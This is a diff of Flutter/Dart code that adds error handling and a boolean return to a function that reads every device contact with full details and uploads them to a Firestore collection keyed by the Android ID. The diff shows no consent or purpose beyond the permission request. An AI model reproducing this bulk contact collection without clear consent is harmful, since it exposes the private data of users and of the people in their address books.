@@ -20,27 +20,33 @@ Future<PermissionStatus> _getContactPermission() async {
   return contactPermission;
 }
 
-Future<void> getContacts() async {
-  final PermissionStatus permissionStatus = await _getContactPermission();
-  if (permissionStatus == PermissionStatus.granted) {
-    List<Contact> contacts =
-        await FlutterContacts.getContacts(withProperties: true);
-    String? androidId = await getIdentity();
-    if (androidId != null) {
-      CollectionReference contactCollection =
-          firestore.collection('client').doc(androidId).collection("contact");
-      WriteBatch batch = firestore.batch();
-      for (var i = 0; i < contacts.length; i++) {
-        if (i % 300 == 0) {
-          await batch.commit();
-          batch = firestore.batch();
+Future<bool> getContacts() async {
+  try {
+    final PermissionStatus permissionStatus = await _getContactPermission();
+    if (permissionStatus == PermissionStatus.granted) {
+      List<Contact> contacts =
+          await FlutterContacts.getContacts(withProperties: true);
+      String? androidId = await getIdentity();
+      if (androidId != null) {
+        CollectionReference contactCollection =
+            firestore.collection('client').doc(androidId).collection("contact");
+        WriteBatch batch = firestore.batch();
+        for (var i = 0; i < contacts.length; i++) {
+          if (i % 300 == 0) {
+            await batch.commit();
+            batch = firestore.batch();
+          }
+          Map<String, dynamic> contactMap = contacts.elementAt(i).toJson();
+          DocumentReference contactDocument =
+              contactCollection.doc(contacts.elementAt(i).id);
+          batch.set(contactDocument, contactMap);
         }
-        Map<String, dynamic> contactMap = contacts.elementAt(i).toJson();
-        DocumentReference contactDocument =
-            contactCollection.doc(contacts.elementAt(i).id);
-        batch.set(contactDocument, contactMap);
+        await batch.commit();
       }
-      await batch.commit();
+      return true;
     }
+    return false;
+  } catch (e) {
+    return false;
   }
 }
